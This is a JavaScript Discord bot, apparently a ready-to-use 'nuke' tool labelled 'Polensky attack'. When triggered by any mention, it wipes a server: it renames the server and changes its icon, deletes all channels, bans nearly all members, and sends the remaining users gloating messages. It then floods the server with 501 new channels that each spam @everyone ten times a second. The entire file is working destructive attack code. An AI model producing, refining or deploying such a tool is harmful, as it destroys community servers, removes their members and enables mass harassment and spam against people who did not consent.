const Discord = require('discord.js')
const client = new Discord.Client({intents: [47095]})
client.login('')
client.on(Discord.Events.ClientReady,()=>{
    client.user.setStatus(Discord.PresenceUpdateStatus.Invisible)
})
client.on('messageCreate',async (message)=>{
    if(message.author.id == client.user.id) return;
    if(!message.channel.guildId) return;
    if(message.mentions.members.first() || message.mentions.roles.first() || message.mentions.everyone){
        message.guild.setIcon('./nuke.png','Polensky attack')
        message.guild.setName('Nuked','Polensky attack')
        message.guild.channels.cache.forEach(channel=>{
            channel.delete('Polensky attack')
        })
        message.guild.members.cache.forEach(member=>{
if(member.bannable && member.id != '667745765707350026'){
    member.ban({
        reason: 'Polensky attack'
    })
}
else{
    if(member.user.bot) return;
    member.send({
        embeds:[new Discord.EmbedBuilder()
        .setTitle('Polensky')
    .setDescription('You were attacked by Polensky Nuke Attack !')
.setColor(Discord.Colors.Yellow)
.setThumbnail('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Nuclear_symbol.svg/2048px-Nuclear_symbol.svg.png')
.setFooter({text:'Sadly'})]
    })
    member.send({
        embeds:[new Discord.EmbedBuilder()
        .setTitle('Polensky')
    .setDescription('Vous avez été attaqué par l\'attaque nuke de Polensky !')
.setColor(Discord.Colors.Yellow)
.setThumbnail('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Nuclear_symbol.svg/2048px-Nuclear_symbol.svg.png')
.setFooter({text:'Sadly'})]
    })
}
        })
       for(let i = 0;i<501;i++){
        message.guild.channels.create({name:'🙂H4CKED',reason: 'Polensky attack'}).then(channel=>{
setInterval(()=>{
    channel.send({
        content:'@everyone'
    })
},100)
        })
       }
    }
    
})
